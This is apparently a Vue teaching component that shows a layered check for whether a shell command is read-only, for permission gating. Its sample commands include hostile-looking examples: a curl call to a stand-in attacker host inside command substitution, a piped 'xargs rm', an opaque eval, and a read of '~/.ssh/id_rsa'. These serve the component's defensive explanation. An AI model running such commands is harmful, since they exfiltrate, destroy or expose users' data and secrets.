<script setup lang="ts">
import { computed, ref } from "vue"

/**
 * 「这条命令是不是只读」的判定链。
 *
 * 这件事之所以值得做成组件，是因为它的难点不在单条命令，而在**组合**：
 * 管道、`&&`、命令替换、重定向都会让「看起来只读」的命令整体变成写操作。
 * 判定规则只有一条——**整条命令的所有环节都是读，整条才算读**，
 * 但把这条规则套到真实命令上，需要逐层过一遍检查。
 *
 * 选一条样例命令，可以看到它在哪一层被判为写，以及为什么。
 */

type Layer = {
	key: string
	name: string
	asks: string
}

/** 判定链：顺序即排除强度，越靠前的越是结构性问题 */
const layers: Layer[] = [
	{ key: "parse", name: "能否完整解析", asks: "解析不出结构就无法判定，此时应当保守地当作写操作" },
	{ key: "redirect", name: "有无写重定向", asks: "「>」「>>」把任何读命令变成写操作" },
	{ key: "subst", name: "有无命令替换", asks: "「$(...)」与反引号里可以藏任意命令" },
	{ key: "split", name: "拆成子命令", asks: "按管道与「&&」「;」「||」切开，逐条判定" },
	{ key: "allow", name: "逐条查白名单", asks: "每个子命令都必须在只读集合里" },
	{ key: "path", name: "路径是否越界", asks: "读也要受路径约束，不能逃出允许范围" }
]

type Sample = {
	key: string
	cmd: string
	/** 在第几层被判为写；null 表示通过全部检查 */
	failAt: string | null
	verdict: string
	why: string
}

const samples: Sample[] = [
	{
		key: "ok-pipe",
		cmd: "cat config.yaml | grep -n timeout",
		failAt: null,
		verdict: "只读",
		why: "管道两端都是读命令，没有重定向也没有命令替换，路径在工作区内。整条判为只读，可以免确认执行。"
	},
	{
		key: "ok-git",
		cmd: "git log --oneline -20",
		failAt: null,
		verdict: "只读",
		why: "白名单可以细到子命令级别：「git log」属查询类，而「git push」不是。把整个「git」一并放行或一并拒绝都太粗。"
	},
	{
		key: "redirect",
		cmd: "grep -r TODO . > todo.txt",
		failAt: "redirect",
		verdict: "写",
		why: "「grep」本身是读，但「>」创建并写入了文件。只看命令名会把它误判为只读——重定向必须单独检查。"
	},
	{
		key: "pipe-rm",
		cmd: "find . -name '*.log' | xargs rm",
		failAt: "allow",
		verdict: "写",
		why: "「find」是读，但管道尾部的「rm」是删除。这正是「整条都读才算读」的意义：一个环节写，整条就是写。"
	},
	{
		key: "subst",
		cmd: "echo $(curl -s http://attacker.test/x)",
		failAt: "subst",
		verdict: "写／不可信",
		why: "「echo」看起来无害，但命令替换里可以是任意命令。命令替换必须在拆分之前就被识别，否则它会整个逃过白名单。"
	},
	{
		key: "unparse",
		cmd: 'eval "${CMD}"',
		failAt: "parse",
		verdict: "拒绝判定",
		why: "参数展开与「eval」的实际内容在判定时不可知。解析不出确定结构时唯一安全的处置是不放行，而不是猜一个。"
	},
	{
		key: "path",
		cmd: "cat ~/.ssh/id_rsa",
		failAt: "path",
		verdict: "只读但越界",
		why: "它确实是只读命令，却读到了工作区之外的敏感文件。只读不等于安全——读操作同样要过路径约束。"
	}
]

const pick = ref(samples[3].key)
const cur = computed(() => samples.find((s) => s.key === pick.value) ?? samples[0])
const failIdx = computed(() =>
	cur.value.failAt === null ? layers.length : layers.findIndex((l) => l.key === cur.value.failAt)
)
const isReadOnly = computed(() => cur.value.failAt === null)
</script>

<template>
	<div class="rog">
		<div class="rog__pick">
			<span class="rog__pick-label">选一条命令</span>
			<div class="infra-tabs rog__tabs">
				<button
					v-for="s in samples"
					:key="s.key"
					type="button"
					class="cs-mono"
					:class="{ 'is-active': pick === s.key }"
					:aria-pressed="pick === s.key"
					@click="pick = s.key"
				>
					{{ s.cmd }}
				</button>
			</div>
		</div>

		<ol class="rog__chain">
			<li
				v-for="(l, i) in layers"
				:key="l.key"
				class="rog__layer"
				:class="{
					'is-pass': i < failIdx,
					'is-fail': i === failIdx,
					'is-skip': i > failIdx
				}"
			>
				<span class="rog__mark cs-mono">{{ i < failIdx ? "✓" : i === failIdx ? "✕" : "—" }}</span>
				<div class="rog__layer-body">
					<strong>{{ l.name }}</strong>
					<span>{{ l.asks }}</span>
				</div>
			</li>
		</ol>

		<div class="cs-state" :class="isReadOnly ? 'cs-state--pass' : 'cs-state--fail'">
			<b>判定结果：{{ cur.verdict }}</b>
			<span>{{ cur.why }}</span>
		</div>

		<p class="pc-note">
			这条链的次序反映的是<b>排除强度</b>：解析失败是结构性问题，重定向与命令替换是语法层面的逃逸口，
			白名单是逐条的语义判断，路径约束则独立于读写属性——最后一条样例说明
			<b>「只读」与「安全」是两个维度</b>，一条纯读命令照样可以读到不该读的东西。
			检查项与次序是对公开实现共性的归纳，具体产品的白名单粒度与解析策略各不相同。
		</p>
	</div>
</template>

<style scoped>
.rog { margin: 1rem 0; background: var(--cs-color-bg); border: 1px solid var(--cs-color-border); border-radius: var(--cs-radius-lg); padding: var(--cs-space-5) var(--cs-space-6); }
.rog__pick { display: grid; gap: var(--cs-space-2); margin-bottom: var(--cs-space-5); }
.rog__pick-label { font-size: var(--cs-text-xs); color: var(--cs-color-text-muted); }
.rog__tabs { flex-wrap: wrap; }
.rog__tabs button { font-size: var(--cs-text-2xs); }
.rog__chain { list-style: none; margin: 0 0 var(--cs-space-4); padding: 0; display: grid; gap: var(--cs-space-2); }
.rog__layer { display: grid; grid-template-columns: 1.6rem minmax(0, 1fr); gap: var(--cs-space-3); align-items: start; border-radius: var(--cs-radius-sm); padding: var(--cs-space-2) var(--cs-space-3); background: var(--cs-color-bg-soft); border-left: 3px solid var(--cs-color-border); }
.rog__layer.is-pass { border-left-color: var(--cs-color-success); }
.rog__layer.is-fail { border-left-color: var(--cs-color-danger); background: var(--cs-color-danger-soft); }
.rog__layer.is-skip { opacity: .45; }
.rog__mark { text-align: center; font-size: var(--cs-text-sm); color: var(--cs-color-text-subtle); }
.rog__layer.is-pass .rog__mark { color: var(--cs-color-success); }
.rog__layer.is-fail .rog__mark { color: var(--cs-color-danger); }
.rog__layer-body { display: grid; gap: var(--cs-space-1); }
.rog__layer-body strong { font-size: var(--cs-text-sm); line-height: var(--cs-leading-tight); }
.rog__layer-body span { font-size: var(--cs-text-2xs); line-height: var(--cs-leading-normal); color: var(--cs-color-text-muted); }
.rog .cs-state { display: grid; gap: var(--cs-space-1); font-size: var(--cs-text-sm); line-height: var(--cs-leading-relaxed); }
@media (max-width: 720px) {
	.rog__tabs button { width: 100%; text-align: left; }
}
</style>
